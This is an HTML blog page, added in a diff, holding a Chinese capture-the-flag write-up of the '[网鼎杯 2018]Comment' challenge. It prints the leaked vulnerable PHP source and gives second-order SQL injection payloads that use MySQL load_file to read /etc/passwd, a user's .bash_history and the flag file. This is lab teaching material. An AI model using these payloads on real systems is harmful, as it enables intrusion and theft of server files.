@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="涉及.Git源码泄漏，二次注入（可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入）mysql  load_file读取文件函数1、必须有权限读取并且文件必须完全可读。 12and (select count(*) from mysql.user)&gt;0 &#x2F;*如果结果返回正常，说明具有读写权限.*&#x2F;and (select count(*) from mysql.use">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU｜[网鼎杯 2018]Comment">
+<meta property="og:url" content="http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="涉及.Git源码泄漏，二次注入（可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入）mysql  load_file读取文件函数1、必须有权限读取并且文件必须完全可读。 12and (select count(*) from mysql.user)&gt;0 &#x2F;*如果结果返回正常，说明具有读写权限.*&#x2F;and (select count(*) from mysql.use">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004008.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004024.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004040.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004053.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004110.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004136.jpg">
+<meta property="article:published_time" content="2020-03-12T22:03:29.000Z">
+<meta property="article:modified_time" content="2021-02-16T16:41:40.327Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004008.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUU｜[网鼎杯 2018]Comment</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/13/BUU%E5%88%B7%E9%A2%98-SUCTF-2018-GetShell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/12/Git%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&text=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&is_video=false&description=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUU｜[网鼎杯 2018]Comment&body=Check out this article: http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&name=BUU｜[网鼎杯 2018]Comment&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&t=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%B9%9F%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9D%91%EF%BC%8C%E5%B0%B1%E6%98%AFsql%E8%AF%AD%E5%8F%A5%E6%98%AF%E6%8D%A2%E8%A1%8C%E7%9A%84%EF%BC%8C-%E8%BF%9B%E8%A1%8C%E6%B3%A8%E9%87%8A%E5%8F%AA%E8%83%BD%E6%B3%A8%E9%87%8A%E5%BD%93%E5%89%8D%E8%A1%8C%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%BF%99%E9%87%8C%E7%94%A8-%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5%E6%B3%A8%E9%87%8A%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">这里也是一个坑，就是sql语句是换行的，#进行注释只能注释当前行，所以我们这里用&#x2F;**&#x2F;进行拼接注释。</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.0.0.0.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUU｜[网鼎杯 2018]Comment
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Elli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-12T22:03:29.000Z" itemprop="datePublished">2020-03-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WEB/" rel="tag">WEB</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>涉及.Git源码泄漏，二次注入（可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入）<br>mysql  load_file读取文件函数<br>1、必须有权限读取并且文件必须完全可读。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0 &#x2F;*如果结果返回正常，说明具有读写权限.*&#x2F;</span><br><span class="line">and (select count(*) from mysql.user)&gt;0 &#x2F;* 返回错误，应该是管理员给数据库账户降权了*&#x2F;</span><br></pre></td></tr></table></figure>
+<p>2、欲读取文件必须在服务器上<br>3、必须指定文件完整的路径<br>4、欲读取文件必须小于max_allowed_packet</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>乍一看，没啥发现。但是往控制台看就会发现有hint</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004008.png" alt="Elements"></p>
+<p>githacker一下，然后得到一个不完整的php文件，再进行恢复<br><code>git log --reflog</code><br><code>git reset --hard af36ba2d86ee43cde7b95db513906975cb8ece03</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);<span class="comment">//使用反斜线引用字符串(转义)</span></span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>二次注入。<br>登陆评论（登陆密码爆破得zhangwei666）<br>构造payload进行发帖。</p>
+<h2 id="这里也是一个坑，就是sql语句是换行的，-进行注释只能注释当前行，所以我们这里用-进行拼接注释。"><a href="#这里也是一个坑，就是sql语句是换行的，-进行注释只能注释当前行，所以我们这里用-进行拼接注释。" class="headerlink" title="这里也是一个坑，就是sql语句是换行的，#进行注释只能注释当前行，所以我们这里用/**/进行拼接注释。"></a>这里也是一个坑，就是sql语句是换行的，#进行注释只能注释当前行，所以我们这里用/**/进行拼接注释。</h2><p><code>123&#39;,content=user(),/*</code><br><code>*/#</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004024.png" alt="1"></p>
+<p>接下来思路：<br>查看/etc/passwd发现www用户目录<br><code>123&#39;,content=(select(load_file(&#39;/etc/passwd&#39;))),/*</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004040.png" alt="2"></p>
+<p>查看history文件(.bash_history)<br><code>123&#39;,content=(select(load_file(&#39;/home/www/.bash_history&#39;))),/*</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004053.png" alt="3"></p>
+<p>发现在/tmp/html下有个.DS_Store文件<br>用payload查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004110.jpg" alt="qwe"></p>
+<p><strong>结果发现长度不够，那咱们hex编码显示</strong></p>
+<blockquote>
+<p>这里为什么要用hex编码展开了一番讨论，Hex传输(base64编码也是)是为了保证数据的完整性 ，而为什么不同的传输不能显示出来呢？因为有无法识别的编码的问题。用Hex传输后解码会看到F(后面是乱码<img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217004136.jpg" alt="hex">所以出来的不完整。</p>
+</blockquote>
+<p><code>123&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code><br>hex解码发现文件名：flag_8946e1ff1ee3e40f.php<br><code>123&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code><br>hex解码出flag</p>
+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Tkitn/p/11649255.html">https://www.cnblogs.com/Tkitn/p/11649255.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html</a><br>二次注入：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/746164a91422">https://www.jianshu.com/p/746164a91422</a><br>mysql load_file在数据库注入中使用:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/blacksunny/p/8060028.html">https://www.cnblogs.com/blacksunny/p/8060028.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%B9%9F%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9D%91%EF%BC%8C%E5%B0%B1%E6%98%AFsql%E8%AF%AD%E5%8F%A5%E6%98%AF%E6%8D%A2%E8%A1%8C%E7%9A%84%EF%BC%8C-%E8%BF%9B%E8%A1%8C%E6%B3%A8%E9%87%8A%E5%8F%AA%E8%83%BD%E6%B3%A8%E9%87%8A%E5%BD%93%E5%89%8D%E8%A1%8C%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%BF%99%E9%87%8C%E7%94%A8-%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5%E6%B3%A8%E9%87%8A%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">这里也是一个坑，就是sql语句是换行的，#进行注释只能注释当前行，所以我们这里用&#x2F;**&#x2F;进行拼接注释。</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.0.0.0.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&text=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&is_video=false&description=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUU｜[网鼎杯 2018]Comment&body=Check out this article: http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&title=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&name=BUU｜[网鼎杯 2018]Comment&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/03/13/BUU%E5%88%B7%E9%A2%98%EF%BD%9C-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/&t=BUU｜[网鼎杯 2018]Comment"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
